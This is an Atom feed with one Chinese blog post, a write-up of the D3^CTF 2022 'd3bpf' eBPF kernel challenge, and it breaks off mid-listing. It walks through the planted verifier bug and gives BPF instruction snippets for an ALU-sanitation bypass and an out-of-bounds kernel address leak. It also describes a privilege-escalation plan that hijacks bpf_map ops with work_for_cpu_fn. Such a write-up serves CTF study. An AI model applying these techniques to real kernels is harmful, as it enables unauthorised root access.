<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2023-01-06T11:55:39.052Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>d3bpf</title>
    <link href="https://cv196082.gitee.io/2023/01/06/d3bpf/"/>
    <id>https://cv196082.gitee.io/2023/01/06/d3bpf/</id>
    <published>2023-01-06T11:55:01.000Z</published>
    <updated>2023-01-06T11:55:39.052Z</updated>
    
    <content type="html"><![CDATA[<p>虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="line">index <span class="number">2834</span>d1afa.<span class="number">.0</span>a79c9099 <span class="number">100644</span></span><br><span class="line">--- a/fs/fs_context.c</span><br><span class="line">+++ b/fs/fs_context.c</span><br><span class="line">@@ <span class="number">-530</span>,<span class="number">7</span> +<span class="number">530</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function">       param-&gt;key)</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">+<span class="keyword">if</span> (size + len + <span class="number">2</span> &gt; PAGE_SIZE) <span class="comment">// patch for CVE-2022-0185</span></span><br><span class="line"> <span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">     (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">37581919</span>e.<span class="number">.8e98</span>d4af5 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-6455</span>,<span class="number">11</span> +<span class="number">6455</span>,<span class="number">11</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> BPF_RSH:</span><br><span class="line">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">- * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">- */</span></span><br><span class="line">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span><br><span class="line">+<span class="keyword">if</span> (alu32)</span><br><span class="line">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+__mark_reg_known_zero(dst_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (alu32)</span><br><span class="line">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="line">index <span class="number">6b</span>bc7a448..d949fdf00 <span class="number">100644</span></span><br><span class="line">--- a/net/packet/af_packet.c</span><br><span class="line">+++ b/net/packet/af_packet.c</span><br><span class="line">@@ <span class="number">-4448</span>,<span class="number">9</span> +<span class="number">4448</span>,<span class="number">10</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> packet_set_ring(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> out_free_pg_vec:</span><br><span class="line">-bitmap_free(rx_owner_map);</span><br><span class="line">-<span class="keyword">if</span> (pg_vec)</span><br><span class="line">+<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">+bitmap_free(rx_owner_map); <span class="comment">// patch for CVE-2021-22600</span></span><br><span class="line"> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">+&#125;</span><br><span class="line"> out:</span><br><span class="line"> <span class="keyword">return</span> err;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复<code>CVE-2022-0185</code>，在文件的最下面是一个patch，也明说了就是为了修复<code>CVE-2021-22600</code>，不过上面还有一段修改。</p><p>上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。</p><p>这里因为架构的原因，如果我们使用右移64位得到的结果为1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 1 &gt;&gt; 64</span><br><span class="line"><span class="variable">$3</span> = 0x1</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。</p><p>观察题目的启动命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 128M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 kaslr quiet&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><p>基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h3><p>因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识<code>bpf_map</code>结构体:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line"><span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line"><span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line"><span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line"><span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line"><span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们在开始定义类型为<code>BPF_MAP_TYPE_ARRAY</code>那么结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到在上面的<code>bpf_map</code>结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">array_map_ops</span> =</span> &#123;</span><br><span class="line">.map_meta_equal = array_map_meta_equal,</span><br><span class="line">.map_alloc_check = array_map_alloc_check,</span><br><span class="line">.map_alloc = array_map_alloc,</span><br><span class="line">.map_free = array_map_free,</span><br><span class="line">.map_get_next_key = array_map_get_next_key,</span><br><span class="line">.map_lookup_elem = array_map_lookup_elem,</span><br><span class="line">.map_update_elem = array_map_update_elem,</span><br><span class="line">.map_delete_elem = array_map_delete_elem,</span><br><span class="line">.map_gen_lookup = array_map_gen_lookup,</span><br><span class="line">.map_direct_value_addr = array_map_direct_value_addr,</span><br><span class="line">.map_direct_value_meta = array_map_direct_value_meta,</span><br><span class="line">.map_mmap = array_map_mmap,</span><br><span class="line">.map_seq_show_elem = array_map_seq_show_elem,</span><br><span class="line">.map_check_btf = array_map_check_btf,</span><br><span class="line">.map_lookup_batch = generic_map_lookup_batch,</span><br><span class="line">.map_update_batch = generic_map_update_batch,</span><br><span class="line">.map_btf_name = <span class="string">&quot;bpf_array&quot;</span>,</span><br><span class="line">.map_btf_id = &amp;array_map_btf_id,</span><br><span class="line">.iter_seq_info = &amp;iter_seq_info,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为我们上面所选择的类型为数组，所以这里ops会包含<code>array_map_ops</code>指针，所以我们可以利用它来泄漏内核地址。</p><p>如果我们使用<code>BPF_FUNC_map_lookup_elem</code>来进行函数调用的话，根据上述ops我们最终会调用到<code>array_map_lookup_elem</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from syscall or from eBPF program */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">array_map_lookup_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>-&gt;value + <span class="built_in">array</span>-&gt;elem_size * (index &amp; <span class="built_in">array</span>-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是<code>map_ptr.value</code>所以可以根据这里的偏移得出返回内容为<code>map_ptr+0x110</code>的地址。</p><p>可能到这里大家都应该有一定的思路了，不过这里还存在一个检测<code>ALU Sanitation</code>，在这个检测中<code>alu_limit</code>表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们<code>src_reg</code>的值大于<code>alu_limit</code>或者与之符号相反，那么<code>src_reg</code>会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_0, EXP_REG),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, OOB_REG, <span class="number">0x1000</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, <span class="number">0x1000</span> - <span class="number">1</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br></pre></td></tr></table></figure><p>因为这里存在一个verifier为0的寄存器<code>EXP_REG</code>那么我们如果进行上述代码中的操作即可是的<code>alm_limit</code>为<code>0x1000</code></p><p>那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure><p>只需要将<code>oob_map</code>的<code>array_map_ops</code>放到<code>store_map</code>的value中去即可。并且在<code>bpf_map</code>中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取<code>oob_map</code>的地址了。</p><p>不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，<code>obj_get_info_by_fd</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">u32 info_len = attr-&gt;info.info_len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uinfo, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">info_len = <span class="keyword">min_t</span>(u32, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">info.type = <span class="built_in">map</span>-&gt;map_type;</span><br><span class="line">info.id = <span class="built_in">map</span>-&gt;id;</span><br><span class="line">info.key_size = <span class="built_in">map</span>-&gt;key_size;</span><br><span class="line">info.value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line">info.max_entries = <span class="built_in">map</span>-&gt;max_entries;</span><br><span class="line">info.map_flags = <span class="built_in">map</span>-&gt;map_flags;</span><br><span class="line"><span class="built_in">memcpy</span>(info.name, <span class="built_in">map</span>-&gt;name, <span class="keyword">sizeof</span>(<span class="built_in">map</span>-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line">info.btf_vmlinux_value_type_id = <span class="built_in">map</span>-&gt;btf_vmlinux_value_type_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_info_fill(&amp;info, <span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u32 <span class="title">btf_obj_id</span><span class="params">(<span class="keyword">const</span> struct btf *btf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> btf-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我们控制<code>bpf_map</code>结构体中的btf即可实现真正意义上的任意地址泄漏。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>其实这里的提权方式可能大家都能想到，因为在<code>bpf_map</code>结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。</p><p>这里选择的最终利用函数是前面提到过的<code>work_for_cpu_fn</code>函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中<code>map_get_next_key</code>函数所在位置的指针替换为<code>work_for_cpu_fn</code>，紧接着写入到<code>oob_map</code>的value中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *next_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (!(map_get_sys_perms(<span class="built_in">map</span>, f) &amp; FMODE_CAN_READ)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ukey) &#123;</span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">next_key = kvmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line"><span class="keyword">if</span> (!next_key)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(unext_key, next_key, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span 